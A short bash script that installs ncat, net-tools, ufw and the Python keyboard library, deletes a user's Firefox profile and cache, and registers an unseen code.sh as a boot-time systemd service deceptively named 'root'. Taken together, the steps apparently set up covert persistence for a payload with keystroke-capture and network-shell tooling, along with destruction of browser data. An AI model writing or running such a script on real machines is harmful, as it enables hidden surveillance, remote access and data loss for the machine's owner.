#!/bin/bash
source venv/bin/activate
sudo apt-get update
sudo apt-get install -y ncat &
sudo apt-get install -y ufw &
sudo apt install net-tools &
pip install keyboard
sudo rm -rf /home/bequery/snap/firefox/common/.mozilla/firefox
sudo rm -rf /home/bequery/snap/firefox/common/.cache/mozilla/firefox
sudo chmod +x code.sh
(
SERVICE_NAME="root"
SCRIPT_PATH="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/code.sh"
SERVICE_FILE="/etc/systemd/system/${SERVICE_NAME}.service"

# Create the systemd service file
sudo bash -c "cat > ${SERVICE_FILE}" <<EOL
[Unit]
Description=root_service
After=network.target

[Service]
Type=oneshot
ExecStart=${SCRIPT_PATH}
RemainAfterExit=true

[Install]
WantedBy=multi-user.target
EOL

sudo systemctl daemon-reload

sudo systemctl enable ${SERVICE_NAME}.service

sudo systemctl start ${SERVICE_NAME}.service
)
